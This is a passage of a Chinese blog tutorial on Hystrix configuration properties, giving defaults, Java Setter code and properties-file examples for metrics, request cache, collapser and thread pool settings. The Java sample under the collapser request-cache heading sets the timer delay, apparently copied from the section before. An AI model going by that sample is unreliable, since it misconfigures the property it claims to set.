&lt;/tr&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;建议(笔者备注)&lt;/td&gt;
&lt;td&gt;建议保持默认值&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;编程式配置：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class CustomCommand extends HystrixCommand&amp;lt;String&amp;gt; {

    public CustomCommand() {
        super(Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey(&quot;CustomCommand&quot;))
                .andCommandPropertiesDefaults(HystrixCommandProperties.Setter()
                        .withMetricsRollingPercentileWindowBuckets(6)));
    }

    @Override
    protected String run() throws Exception {
        return null;
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;配置文件中(Properties)配置：&lt;/p&gt;
&lt;pre class=&quot;properties&quot;&gt;
&lt;code&gt;# 下面配置二选一

# 默认全局配置
hystrix.command.default.metrics.rollingPercentile.numBuckets=6

# 实例配置
hystrix.command.CustomCommand.metrics.rollingPercentile.numBuckets=6&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;百分数计算使用的bucket容量&quot;&gt;百分数计算使用的Bucket容量&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;metrics.rollingPercentile.bucketSize&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;2&quot;&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;默认值&lt;/td&gt;
&lt;td&gt;&lt;code&gt;100&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;可选值&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;默认全局配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.command.default.metrics.rollingPercentile.bucketSize&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;实例配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.command.[HystrixCommandKey].metrics.rollingPercentile.bucketSize&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;建议(笔者备注)&lt;/td&gt;
&lt;td&gt;建议保持默认值&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;编程式配置：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class CustomCommand extends HystrixCommand&amp;lt;String&amp;gt; {

    public CustomCommand() {
        super(Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey(&quot;CustomCommand&quot;))
                .andCommandPropertiesDefaults(HystrixCommandProperties.Setter()
                        .withMetricsRollingPercentileBucketSize(100)));
    }

    @Override
    protected String run() throws Exception {
        return null;
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;配置文件中(Properties)配置：&lt;/p&gt;
&lt;pre class=&quot;properties&quot;&gt;
&lt;code&gt;# 下面配置二选一

# 默认全局配置
hystrix.command.default.metrics.rollingPercentile.bucketSize=100

# 实例配置
hystrix.command.CustomCommand.metrics.rollingPercentile.bucketSize=100&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;健康状态快照收集的周期&quot;&gt;健康状态快照收集的周期&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;metrics.healthSnapshot.intervalInMilliseconds&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;2&quot;&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;默认值&lt;/td&gt;
&lt;td&gt;&lt;code&gt;500&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;可选值&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;默认全局配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.command.default.metrics.healthSnapshot.intervalInMilliseconds&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;实例配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.command.[HystrixCommandKey].metrics.healthSnapshot.intervalInMilliseconds&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;建议(笔者备注)&lt;/td&gt;
&lt;td&gt;建议保持默认值&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;编程式配置：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class CustomCommand extends HystrixCommand&amp;lt;String&amp;gt; {

    public CustomCommand() {
        super(Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey(&quot;CustomCommand&quot;))
                .andCommandPropertiesDefaults(HystrixCommandProperties.Setter()
                        .withMetricsHealthSnapshotIntervalInMilliseconds(500)));
    }

    @Override
    protected String run() throws Exception {
        return null;
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;配置文件中(Properties)配置：&lt;/p&gt;
&lt;pre class=&quot;properties&quot;&gt;
&lt;code&gt;# 下面配置二选一

# 默认全局配置
hystrix.command.default.metrics.healthSnapshot.intervalInMilliseconds=500

# 实例配置
hystrix.command.CustomCommand.metrics.healthSnapshot.intervalInMilliseconds=500&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;请求上下文配置&quot;&gt;请求上下文配置&lt;/h2&gt;
&lt;p&gt;请求上下文属性主要涉及到&lt;code&gt;HystrixRequestContext&lt;/code&gt;和&lt;code&gt;HystrixCommand&lt;/code&gt;的使用。&lt;/p&gt;
&lt;h3 id=&quot;是否启用请求缓存&quot;&gt;是否启用请求缓存&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;requestCache.enabled&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;2&quot;&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;默认值&lt;/td&gt;
&lt;td&gt;&lt;code&gt;true&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;可选值&lt;/td&gt;
&lt;td&gt;&lt;code&gt;true&lt;/code&gt;、&lt;code&gt;false&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;默认全局配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.command.default.requestCache.enabled&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;实例配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.command.[HystrixCommandKey].requestCache.enabled&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;建议(笔者备注)&lt;/td&gt;
&lt;td&gt;建议保持默认值&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;编程式配置：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class CustomCommand extends HystrixCommand&amp;lt;String&amp;gt; {

    public CustomCommand() {
        super(Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey(&quot;CustomCommand&quot;))
                .andCommandPropertiesDefaults(HystrixCommandProperties.Setter()
                        .withRequestCacheEnabled(true)));
    }

    @Override
    protected String run() throws Exception {
        return null;
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;配置文件中(Properties)配置：&lt;/p&gt;
&lt;pre class=&quot;properties&quot;&gt;
&lt;code&gt;# 下面配置二选一

# 默认全局配置
hystrix.command.default.requestCache.enabled=true

# 实例配置
hystrix.command.CustomCommand.requestCache.enabled=true&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;是否启用请求日志&quot;&gt;是否启用请求日志&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;requestLog.enabled&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;2&quot;&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;默认值&lt;/td&gt;
&lt;td&gt;&lt;code&gt;true&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;可选值&lt;/td&gt;
&lt;td&gt;&lt;code&gt;true&lt;/code&gt;、&lt;code&gt;false&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;默认全局配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.command.default.requestLog.enabled&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;实例配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.command.[HystrixCommandKey].requestLog.enabled&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;建议(笔者备注)&lt;/td&gt;
&lt;td&gt;建议保持默认值&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;编程式配置：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class CustomCommand extends HystrixCommand&amp;lt;String&amp;gt; {

    public CustomCommand() {
        super(Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey(&quot;CustomCommand&quot;))
                .andCommandPropertiesDefaults(HystrixCommandProperties.Setter()
                        .withRequestLogEnabled(true)));
    }

    @Override
    protected String run() throws Exception {
        return null;
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;配置文件中(Properties)配置：&lt;/p&gt;
&lt;pre class=&quot;properties&quot;&gt;
&lt;code&gt;# 下面配置二选一

# 默认全局配置
hystrix.command.default.requestLog.enabled=true

# 实例配置
hystrix.command.CustomCommand.requestLog.enabled=true&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;请求合成器配置&quot;&gt;请求合成器配置&lt;/h2&gt;
&lt;p&gt;请求合成器配置主要控制&lt;code&gt;HystrixCollapser&lt;/code&gt;的行为。&lt;/p&gt;
&lt;h3 id=&quot;请求合成的最大批次量&quot;&gt;请求合成的最大批次量&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;maxRequestsInBatch&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;2&quot;&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;默认值&lt;/td&gt;
&lt;td&gt;&lt;code&gt;Integer.MAX_VALUE&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;可选值&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;默认全局配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.collapser.default.maxRequestsInBatch&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;实例配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.collapser.[HystrixCollapserKey].maxRequestsInBatch&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;建议(笔者备注)&lt;/td&gt;
&lt;td&gt;建议保持默认值&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;编程式配置：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class CustomHystrixCollapser extends HystrixCollapser&amp;lt;List&amp;lt;String&amp;gt;, String, String&amp;gt; {

    public CustomHystrixCollapser(Setter setter) {
        super(Setter.withCollapserKey(HystrixCollapserKey.Factory.asKey(&quot;CustomHystrixCollapser&quot;))
                .andCollapserPropertiesDefaults(HystrixCollapserProperties.Setter()
                        .withMaxRequestsInBatch(10)));
    }

    @Override
    public String getRequestArgument() {
        return null;
    }

    @Override
    protected HystrixCommand&amp;lt;List&amp;lt;String&amp;gt;&amp;gt; createCommand(Collection&amp;lt;CollapsedRequest&amp;lt;String, String&amp;gt;&amp;gt; collapsedRequests) {
        return null;
    }

    @Override
    protected void mapResponseToRequests(List&amp;lt;String&amp;gt; batchResponse, Collection&amp;lt;CollapsedRequest&amp;lt;String, String&amp;gt;&amp;gt; collapsedRequests) {

    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;配置文件中(Properties)配置：&lt;/p&gt;
&lt;pre class=&quot;properties&quot;&gt;
&lt;code&gt;# 下面配置二选一

# 默认全局配置
hystrix.collapser.default.maxRequestsInBatch=10

# 实例配置
hystrix.collapser.CustomHystrixCollapser.maxRequestsInBatch=10&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;延迟执行时间&quot;&gt;延迟执行时间&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;timerDelayInMilliseconds&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;2&quot;&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;默认值&lt;/td&gt;
&lt;td&gt;&lt;code&gt;10&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;可选值&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;默认全局配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.collapser.default.timerDelayInMilliseconds&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;实例配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.collapser.[HystrixCollapserKey].timerDelayInMilliseconds&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;建议(笔者备注)&lt;/td&gt;
&lt;td&gt;建议保持默认值&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;编程式配置：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class CustomHystrixCollapser extends HystrixCollapser&amp;lt;List&amp;lt;String&amp;gt;, String, String&amp;gt; {

    public CustomHystrixCollapser(Setter setter) {
        super(Setter.withCollapserKey(HystrixCollapserKey.Factory.asKey(&quot;CustomHystrixCollapser&quot;))
                .andCollapserPropertiesDefaults(HystrixCollapserProperties.Setter()
                        .withTimerDelayInMilliseconds(10)));
    }

    @Override
    public String getRequestArgument() {
        return null;
    }

    @Override
    protected HystrixCommand&amp;lt;List&amp;lt;String&amp;gt;&amp;gt; createCommand(Collection&amp;lt;CollapsedRequest&amp;lt;String, String&amp;gt;&amp;gt; collapsedRequests) {
        return null;
    }

    @Override
    protected void mapResponseToRequests(List&amp;lt;String&amp;gt; batchResponse, Collection&amp;lt;CollapsedRequest&amp;lt;String, String&amp;gt;&amp;gt; collapsedRequests) {

    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;配置文件中(Properties)配置：&lt;/p&gt;
&lt;pre class=&quot;properties&quot;&gt;
&lt;code&gt;# 下面配置二选一

# 默认全局配置
hystrix.collapser.default.timerDelayInMilliseconds=10

# 实例配置
hystrix.collapser.CustomHystrixCollapser.timerDelayInMilliseconds=10&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;是否启用请求合成缓存&quot;&gt;是否启用请求合成缓存&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;requestCache.enabled&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;2&quot;&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;默认值&lt;/td&gt;
&lt;td&gt;&lt;code&gt;true&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;可选值&lt;/td&gt;
&lt;td&gt;&lt;code&gt;true&lt;/code&gt;、&lt;code&gt;false&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;默认全局配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.collapser.default.requestCache.enabled&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;实例配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.collapser.[HystrixCollapserKey].requestCache.enabled&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;建议(笔者备注)&lt;/td&gt;
&lt;td&gt;建议保持默认值&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;编程式配置：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class CustomHystrixCollapser extends HystrixCollapser&amp;lt;List&amp;lt;String&amp;gt;, String, String&amp;gt; {

    public CustomHystrixCollapser(Setter setter) {
        super(Setter.withCollapserKey(HystrixCollapserKey.Factory.asKey(&quot;CustomHystrixCollapser&quot;))
                .andCollapserPropertiesDefaults(HystrixCollapserProperties.Setter()
                        .withTimerDelayInMilliseconds(10)));
    }

    @Override
    public String getRequestArgument() {
        return null;
    }

    @Override
    protected HystrixCommand&amp;lt;List&amp;lt;String&amp;gt;&amp;gt; createCommand(Collection&amp;lt;CollapsedRequest&amp;lt;String, String&amp;gt;&amp;gt; collapsedRequests) {
        return null;
    }

    @Override
    protected void mapResponseToRequests(List&amp;lt;String&amp;gt; batchResponse, Collection&amp;lt;CollapsedRequest&amp;lt;String, String&amp;gt;&amp;gt; collapsedRequests) {

    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;配置文件中(Properties)配置：&lt;/p&gt;
&lt;pre class=&quot;properties&quot;&gt;
&lt;code&gt;# 下面配置二选一

# 默认全局配置
hystrix.collapser.default.requestCache.enabled=true

# 实例配置
hystrix.collapser.CustomHystrixCollapser.requestCache.enabled=true&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;线程池配置&quot;&gt;线程池配置&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;Hystrix&lt;/code&gt;使用的是JUC线程池&lt;code&gt;ThreadPoolExecutor&lt;/code&gt;，线程池相关配置直接影响&lt;code&gt;ThreadPoolExecutor&lt;/code&gt;实例。&lt;code&gt;Hystrix&lt;/code&gt;的命令执行选用了线程池策略，那么就是通过线程池隔离执行的，最好为每一个分组设立独立的线程池。笔者在生产实践的时候，一般把&lt;code&gt;HystrixCommandGroupKey&lt;/code&gt;和&lt;code&gt;HystrixThreadPoolKey&lt;/code&gt;设置为一致。&lt;/p&gt;
&lt;h3 id=&quot;核心线程数&quot;&gt;核心线程数&lt;/h3&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;3&quot;&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;默认值&lt;/td&gt;
&lt;td&gt;&lt;code&gt;10&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;可选值&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;默认全局配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.threadpool.default.coreSize&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;实例配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.threadpool.[HystrixThreadPoolKey].coreSize&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;建议(笔者备注)&lt;/td&gt;
&lt;td&gt;根据真实情况自行配置和调整&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;编程式配置：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class CustomCommand extends HystrixCommand&amp;lt;String&amp;gt; {

    public CustomCommand() {
        super(Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey(&quot;CustomCommand&quot;))
                .andThreadPoolPropertiesDefaults(HystrixThreadPoolProperties.Setter()
                        .withCoreSize(10)));
    }

    @Override
    protected String run() throws Exception {
        return null;
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;配置文件中(Properties)配置：&lt;/p&gt;
&lt;pre class=&quot;properties&quot;&gt;
&lt;code&gt;# 下面配置二选一

# 默认全局配置
hystrix.threadpool.default.coreSize=10

# 实例配置
hystrix.threadpool.CustomCommand.coreSize=10&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;最大线程数&quot;&gt;最大线程数&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;maximumSize&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;此属性只有在&lt;code&gt;allowMaximumSizeToDivergeFromCoreSize&lt;/code&gt;为&lt;code&gt;true&lt;/code&gt;的时候才生效。&lt;/p&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;3&quot;&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;默认值&lt;/td&gt;
&lt;td&gt;&lt;code&gt;10&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;可选值&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;默认全局配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.threadpool.default.maximumSize&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;实例配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.threadpool.[HystrixThreadPoolKey].maximumSize&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;建议(笔者备注)&lt;/td&gt;
&lt;td&gt;根据真实情况自行配置和调整&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;编程式配置：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class CustomCommand extends HystrixCommand&amp;lt;String&amp;gt; {

    public CustomCommand() {
        super(Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey(&quot;CustomCommand&quot;))
                .andThreadPoolPropertiesDefaults(HystrixThreadPoolProperties.Setter()
                        .withMaximumSize(10)));
    }

    @Override
    protected String run() throws Exception {
        return null;
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;配置文件中(Properties)配置：&lt;/p&gt;
&lt;pre class=&quot;properties&quot;&gt;
&lt;code&gt;# 下面配置二选一

# 默认全局配置
hystrix.threadpool.default.maximumSize=10

# 实例配置
hystrix.threadpool.CustomCommand.maximumSize=10&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;最大任务队列容量&quot;&gt;最大任务队列容量&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;maxQueueSize&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;此属性配置为-1时使用的是&lt;code&gt;SynchronousQueue&lt;/code&gt;，配置为大于1的整数时使用的是&lt;code&gt;LinkedBlockingQueue&lt;/code&gt;。&lt;/p&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;3&quot;&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;默认值&lt;/td&gt;
&lt;td&gt;&lt;code&gt;-1&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;可选值&lt;/td&gt;
&lt;td&gt;&lt;code&gt;-1&lt;/code&gt;或者大于0的整数&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;默认全局配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.threadpool.default.maxQueueSize&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;实例配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.threadpool.[HystrixThreadPoolKey].maxQueueSize&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;建议(笔者备注)&lt;/td&gt;
&lt;td&gt;根据真实情况自行配置和调整&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;编程式配置：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class CustomCommand extends HystrixCommand&amp;lt;String&amp;gt; {

    public CustomCommand() {
        super(Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey(&quot;CustomCommand&quot;))
                .andThreadPoolPropertiesDefaults(HystrixThreadPoolProperties.Setter()
                        .withMaxQueueSize(-1)));
    }

    @Override
    protected String run() throws Exception {
        return null;
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;配置文件中(Properties)配置：&lt;/p&gt;
&lt;pre class=&quot;properties&quot;&gt;
&lt;code&gt;# 下面配置二选一

# 默认全局配置
hystrix.threadpool.default.maxQueueSize=-1

# 实例配置
hystrix.threadpool.CustomCommand.maxQueueSize=-1&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;任务拒绝的任务队列阈值&quot;&gt;任务拒绝的任务队列阈值&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;queueSizeRejectionThreshold&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;当&lt;code&gt;maxQueueSize&lt;/code&gt;配置为-1的时候，此配置项不生效。&lt;/p&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;3&quot;&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;默认值&lt;/td&gt;
&lt;td&gt;&lt;code&gt;5&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;可选值&lt;/td&gt;
&lt;td&gt;大于0的整数&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;默认全局配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.threadpool.default.queueSizeRejectionThreshold&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;实例配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.threadpool.[HystrixThreadPoolKey].queueSizeRejectionThreshold&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;建议(笔者备注)&lt;/td&gt;
&lt;td&gt;根据真实情况自行配置和调整&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;编程式配置：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class CustomCommand extends HystrixCommand&amp;lt;String&amp;gt; {

    public CustomCommand() {
        super(Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey(&quot;CustomCommand&quot;))
                .andThreadPoolPropertiesDefaults(HystrixThreadPoolProperties.Setter()
                        .withQueueSizeRejectionThreshold(5)));
    }

    @Override
    protected String run() throws Exception {
        return null;
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;配置文件中(Properties)配置：&lt;/p&gt;
&lt;pre class=&quot;properties&quot;&gt;
&lt;code&gt;# 下面配置二选一

# 默认全局配置
hystrix.threadpool.default.queueSizeRejectionThreshold=5

# 实例配置
hystrix.threadpool.CustomCommand.queueSizeRejectionThreshold=5&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;非核心线程存活时间&quot;&gt;非核心线程存活时间&lt;/h3&gt;
